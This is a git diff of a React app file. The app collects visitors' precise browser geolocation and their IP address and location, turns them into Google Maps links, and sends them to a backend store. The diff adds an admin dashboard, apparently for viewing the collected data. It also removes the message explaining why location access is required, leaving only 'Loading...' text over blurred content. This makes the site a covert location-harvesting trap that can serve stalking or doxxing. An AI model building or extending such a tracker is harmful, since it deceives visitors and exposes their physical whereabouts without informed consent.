@@ -1,6 +1,7 @@
 import { useState, useEffect } from 'react';
 import axios from 'axios';
 import FeatureSection from "./components/FeatureSection";
+import AdminDashboard from "./components/AdminDashboard";
 
 // Replace with your actual backend URL (e.g., https://onrender.com)
 export const API_BASE_URL = "http://localhost:10000";
@@ -10,49 +11,52 @@ axios.defaults.timeout = 10000;
 axios.defaults.baseURL = API_BASE_URL; 
 
 function App() {
+  const [currentPage, setCurrentPage] = useState<'main' | 'admin'>('main');
   const [accessGranted, setAccessGranted] = useState<boolean | null>(null);
- const syncUserData = async (lat: number, lng: number) => {
-  try {
-    console.log('Starting sync with backend:', API_BASE_URL);
-    
-    // 1. Fetch IP Info (using geolocation-db.com - CORS enabled)
-    console.log('Fetching location data...');
-    const ipRes = await axios.get('https://geolocation-db.com/json/');
-    const ipData = ipRes.data;
-    console.log('Location Data received:', ipData);
 
-    // 2. Prepare Payload (Matching your Schema)
-    const payload = {
-      accurateLocation: { 
-        lat, 
-        lng, 
-        accurateLocation: `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`
-      },
-      ipLocation: {
-        ip: ipData.IPv4 || 'unknown',
-        city: ipData.city,
-        lat: ipData.latitude,
-        lng: ipData.longitude,
-        location: `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`
-      },
-    };
+  // Define functions
+  const syncUserData = async (lat: number, lng: number) => {
+    try {
+      console.log('Starting sync with backend:', API_BASE_URL);
+      
+      // 1. Fetch IP Info (using geolocation-db.com - CORS enabled)
+      console.log('Fetching location data...');
+      const ipRes = await axios.get('https://geolocation-db.com/json/');
+      const ipData = ipRes.data;
+      console.log('Location Data received:', ipData);
 
-    // 3. Send to Express
-    console.log('Sending payload to backend:', payload);
-    const response = await axios.post('/api/store', payload);
-    console.log('Backend response:', response.data);
-    return response.data;
-  } catch (error: any) {
-    console.error("Sync Error Details:", {
-      message: error.message,
-      code: error.code,
-      status: error.response?.status,
-      data: error.response?.data,
-      config: error.config?.url
-    });
-    throw error;
-  }
-};
+      // 2. Prepare Payload (Matching your Schema)
+      const payload = {
+        accurateLocation: { 
+          lat, 
+          lng, 
+          accurateLocation: `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`
+        },
+        ipLocation: {
+          ip: ipData.IPv4 || 'unknown',
+          city: ipData.city,
+          lat: ipData.latitude,
+          lng: ipData.longitude,
+          location: `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`
+        },
+      };
+
+      // 3. Send to Express
+      console.log('Sending payload to backend:', payload);
+      const response = await axios.post('/api/store', payload);
+      console.log('Backend response:', response.data);
+      return response.data;
+    } catch (error: any) {
+      console.error("Sync Error Details:", {
+        message: error.message,
+        code: error.code,
+        status: error.response?.status,
+        data: error.response?.data,
+        config: error.config?.url
+      });
+      throw error;
+    }
+  };
 
   const getPreciseLocation = () => {
     if (!("geolocation" in navigator)) {
@@ -94,9 +98,36 @@ function App() {
     );
   };
 
+  // Hash routing effect
   useEffect(() => {
-    getPreciseLocation();
-  }, []);  return (
+    const handleHashChange = () => {
+      const hash = window.location.hash.slice(1); // Remove '#'
+      if (hash === 'admin') {
+        setCurrentPage('admin');
+      } else {
+        setCurrentPage('main');
+      }
+    };
+
+    handleHashChange();
+    window.addEventListener('hashchange', handleHashChange);
+    return () => window.removeEventListener('hashchange', handleHashChange);
+  }, []);
+
+  // Geolocation effect - only for main page
+  useEffect(() => {
+    if (currentPage === 'main') {
+      getPreciseLocation();
+    }
+  }, [currentPage]);
+
+  // Show admin dashboard if admin page
+  if (currentPage === 'admin') {
+    return <AdminDashboard />;
+  }
+
+  // Show main page with location permission
+  return (
     <div style={{ position: 'relative' }}>
       <div style={{
         filter: accessGranted !== true ? 'blur(5px)' : 'none',
@@ -124,24 +155,9 @@ function App() {
           padding: '20px'
         }}>
           <div style={{ marginBottom: '20px' }}>
-            {accessGranted === null ? 'Checking location access...' : 'Location access is required to view this website.'}
+            {accessGranted === null ? 'Loading...' : 'Looding...'}
           </div>
-          {accessGranted === false && (
-            <button 
-              onClick={getPreciseLocation}
-              style={{
-                padding: '10px 20px',
-                fontSize: '18px',
-                backgroundColor: '#007bff',
-                color: 'white',
-                border: 'none',
-                borderRadius: '5px',
-                cursor: 'pointer'
-              }}
-            >
-              Grant Location Access
-            </button>
-          )}
+          
         </div>
       )}
     </div>
